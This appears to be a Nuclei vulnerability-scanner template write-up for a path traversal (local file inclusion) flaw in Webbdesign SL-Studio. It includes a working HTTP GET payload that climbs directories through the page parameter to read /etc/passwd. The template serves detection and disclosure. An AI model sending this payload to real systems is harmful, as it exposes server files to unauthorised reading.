# Nuclei Template: Webbdesign SL-Studio - Local File Inclusion
**Template ID:** sl-studio-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`sl-studio-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Webbdesign SL-Studio is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/index.php?page=../../../../../../../../../../etc/passwd
```

## References
- https://cxsecurity.com/issue/WLB-2018110187
